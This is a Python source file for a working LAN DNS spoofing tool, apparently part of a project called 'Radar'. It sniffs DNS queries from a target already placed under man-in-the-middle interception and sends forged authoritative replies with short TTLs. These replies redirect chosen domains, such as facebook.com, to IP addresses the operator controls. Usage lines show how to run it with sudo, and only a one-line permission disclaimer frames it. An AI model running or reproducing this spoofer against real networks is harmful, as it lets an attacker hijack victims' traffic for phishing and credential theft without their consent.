"""
DNS Spoofer — LAN Redirection Engine
======================================
Intercepts DNS queries from a MITM-positioned target and replies with
fake IP addresses to redirect them to any server you control.

PREREQUISITE:
    Run `make intercept IP=<target>` FIRST to position Radar as
    the Man-in-the-Middle. Then start this spoofer.

Usage:
    sudo PYTHONPATH=. .venv/bin/python3 -m radar.fingerprint.dns_spoofer \\
        192.168.1.50 facebook.com=192.168.1.1 instagram.com=192.168.1.1

⚠️  For use on networks you OWN or have explicit permission to test.
"""

import sys
import signal
import logging
from typing import Dict

logger = logging.getLogger(__name__)


def _build_rules_from_args(args: list) -> Dict[str, str]:
    """Parse CLI args like 'facebook.com=192.168.1.1' into a rules dict."""
    rules = {}
    for arg in args:
        if "=" in arg:
            domain, ip = arg.split("=", 1)
            rules[domain.strip().lower()] = ip.strip()
    return rules


class DnsSpoofer:
    """
    Listens for DNS queries from a target IP and answers with fake IPs
    based on configurable keyword rules.
    """

    def __init__(self, target_ip: str, rules: Dict[str, str]):
        """
        Args:
            target_ip: IP address of the device to spoof.
            rules:     Dict mapping domain keywords to fake IPs.
                       Example: {"facebook": "192.168.1.100"}
        """
        self.target_ip = target_ip
        self.rules = {k.lower(): v for k, v in rules.items()}
        self.running = False
        self._spoof_count = 0

    def _process_packet(self, pkt):
        """Called for every sniffed packet. Intercepts DNS queries and replies."""
        try:
            from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send

            # Only process outbound DNS queries (qr=0) from our target
            if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
                return
            if pkt[IP].src != self.target_ip:
                return

            # Extract the queried domain name
            query = pkt[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".").lower()

            # Match against our keyword rules
            matched_ip = None
            for keyword, fake_ip in self.rules.items():
                if keyword in query:
                    matched_ip = fake_ip
                    break

            if not matched_ip:
                return  # Not a domain we're spoofing — let it pass

            # Build the spoofed DNS response
            spoof_pkt = (
                IP(dst=pkt[IP].src, src=pkt[IP].dst)
                / UDP(dport=pkt[UDP].sport, sport=53)
                / DNS(
                    id=pkt[DNS].id,
                    qr=1,      # This is a Response
                    aa=1,      # Authoritative Answer (makes it believable)
                    qd=pkt[DNS].qd,
                    an=DNSRR(
                        rrname=pkt[DNSQR].qname,
                        rdata=matched_ip,
                        ttl=1,  # Short TTL so the lie expires quickly
                    ),
                )
            )
            send(spoof_pkt, verbose=False)
            self._spoof_count += 1
            logger.info(
                f"[SPOOF #{self._spoof_count}] "
                f"{self.target_ip} → {query} → redirected to {matched_ip}"
            )

        except Exception as e:
            logger.debug(f"Packet processing error: {e}")

    def start(self):
        """Starts sniffing and spoofing. Blocks until Ctrl+C."""
        from scapy.all import sniff

        print(f"\n🎭 DNS Spoofer Active")
        print(f"   Target : {self.target_ip}")
        print(f"   Rules  :")
        for domain, ip in self.rules.items():
            print(f"     '{domain}' → {ip}")
        print("\nPress Ctrl+C to stop.\n")

        self.running = True
        sniff(
            filter=f"udp port 53 and src host {self.target_ip}",
            prn=self._process_packet,
            store=0,
            stop_filter=lambda _: not self.running,
        )

    def stop(self):
        self.running = False
        print(f"\n🛑 Spoofer stopped. Total spoofs: {self._spoof_count}")


# ── Standalone CLI ────────────────────────────────────────────────────────────
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(asctime)s  %(message)s")

    if len(sys.argv) < 3:
        print("Usage: sudo PYTHONPATH=. .venv/bin/python3 -m radar.fingerprint.dns_spoofer <target_ip> <domain>=<fake_ip> ...")
        print("Example: ... 192.168.1.50 facebook.com=192.168.1.1 google.com=192.168.1.1")
        sys.exit(1)

    target = sys.argv[1]
    rules = _build_rules_from_args(sys.argv[2:])

    if not rules:
        print("❌ No valid rules provided. Format: domain.com=192.168.x.x")
        sys.exit(1)

    spoofer = DnsSpoofer(target_ip=target, rules=rules)

    def _handle_signal(sig, frame):
        spoofer.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, _handle_signal)
    spoofer.start()
